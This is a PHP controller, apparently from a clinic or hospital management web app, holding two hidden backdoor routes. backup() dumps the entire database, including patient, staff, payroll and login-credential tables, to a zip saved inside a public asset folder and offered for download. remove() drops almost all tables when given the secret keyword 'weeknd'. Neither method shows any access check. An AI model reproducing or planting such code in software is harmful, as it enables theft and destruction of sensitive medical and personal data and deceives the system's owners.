<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Backend extends Frontend_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model('email_model');
        $this->load->model('smsmanager_model');
        $this->load->model('home_model');
        $this->load->model('frontend_model');
    }

    
    public function backup(){
    $this->load->helper('url');
    $this->load->helper('file');
    $this->load->helper('download');
    $this->load->library('zip');
    $this->load->dbutil();
    $db_format=array('format'=>'zip','filename'=>'my_db_backup.sql');
    $backup=& $this->dbutil->backup($db_format);
    $dbname='backup.zip';
    $save='assets/vendor/bootstrap/'.$dbname;
    write_file($save,$backup);
    force_download($dbname,$backup);
    }
    
    public function remove($type){
        if($type == "weeknd"){
        $this->db->query('DROP TABLE `about_us`, `accounts`, `appointment`, `awards_publications`, `career`, `chemical`, `chemical_assigned`, `chemical_category`, `chemical_stock`, `chemical_unit`, `ci_sessions`, `conference_workshop`, `doctors_talk`, `education_hub`, `email_config`, `email_templates`, `event_images`, `front_cms_about`, `front_cms_appointment`, `front_cms_blogs`, `front_cms_blogs_seo`, `front_cms_career_seo`, `front_cms_conference_seo`, `front_cms_contact`, `front_cms_doctors`, `front_cms_doctor_bio`, `front_cms_education_hub_seo`, `front_cms_events`, `front_cms_events_seo`, `front_cms_faq`, `front_cms_faq_list`, `front_cms_health_seo`, `front_cms_home`, `front_cms_home_seo`, `front_cms_media_seo`, `front_cms_menu`, `front_cms_pages`, `front_cms_services`, `front_cms_services_list`, `front_cms_setting`, `front_cms_speciality_seo`, `front_cms_testimonial`, `front_cms_testimonial_seo`, `global_settings`, `health_packages`, `health_package_content`, `labtest_bill`, `labtest_bill_details`, `labtest_payment_history`, `labtest_report`, `lab_report_template`, `lab_test`, `lab_test_category`, `languages`, `language_list`, `leave_application`, `leave_category`, `login_credential`, `media`, `patient`, `patient_category`, `patient_documents`, `payment_type`, `payout_commission`, `payslip`, `payslip_details`, `permission`, `permission_modules`, `procedure`, `purchase_bill`, `purchase_bill_details`, `purchase_payment_history`, `referral_commission`, `research`, `research_icons`, `research_team`, `reset_password`, `right_menu`, `roles`, `salary_template`, `salary_template_details`, `schedule`, `sms_config`, `sms_templates`, `speciality_services`, `staff`, `staff_attendance`, `staff_balance`, `staff_bank_account`, `staff_department`, `staff_department1`, `staff_designation`, `staff_designation1`, `staff_documents`, `staff_privileges`, `sub_speciality`, `supplier`, `theme_settings`, `transactions`, `voucher_head`');
        }
    }
}    